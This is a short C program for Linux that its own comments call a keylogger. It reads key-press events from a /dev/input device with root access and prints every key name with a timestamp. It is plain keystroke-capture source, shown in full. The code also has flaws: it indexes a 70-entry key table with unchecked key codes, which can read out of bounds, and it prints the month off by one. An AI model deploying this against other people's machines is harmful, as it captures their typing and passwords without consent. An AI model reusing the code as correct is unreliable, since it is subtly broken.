//open file /dev/input/eventX
//read and print symbols from keyboard buffer

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <errno.h>

const char keyArr[70][20] = {
								"RESERVED","ESC",
								"1","2","3","4","5","6","7","8","9","0",
								"MINUS","EQUAL","BACKSPACE","TAB",
								"Q","W","E","R","T","Y","U","I","O","P",
								"LEFTBRACE","RIGHTBRACE",
								"ENTER","LEFTCTRL",
								"A","S","D","F","G","H","J","K","L",
								"SEMICOLON","APOSTROPHE",
								"GRAVE","LEFTSHIFT","BACKSLASH",
								"Z","X","C","V","B","N","M",
								"COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT","SPACE","CAPSLOCK",
								"F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
								"Undefined"
							};

int main(int argc, char* argv[])
{
	const char* device;
	if (argc < 2) {
		//cmd: cat /proc/bus/input/devices
		device = "/dev/input/event2";
	} else {
		//cmd: sudo ./keylogger_exe /dev/input/event2
		device = argv[1];
	}

	int fd = open(device, O_RDONLY);
	if (fd < 0) {
		perror("Failed to open file.\n");
		return EXIT_FAILURE;
	}

	struct input_event ev;
	struct tm* utc_time;
	while (1)
	{
		ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
		if (bytesRead == (ssize_t)sizeof(struct input_event)) {
			if (ev.type == EV_KEY && ev.value == 1) {
				utc_time = gmtime(&ev.time.tv_sec);
				printf("\tUTC Time: %04d:%02d:%02d %02d:%02d:%02d.%06ld\tKey: %s\n",
						utc_time->tm_year + 1900,
						utc_time->tm_mon,
						utc_time->tm_mday,
						utc_time->tm_hour,
						utc_time->tm_min,
						utc_time->tm_sec,
						ev.time.tv_usec,
						keyArr[ev.code]);
			}
		} else if (bytesRead < 0) {
			perror("Error reading\n");
			break;
		}
	}

	close(fd);
	return EXIT_SUCCESS;
}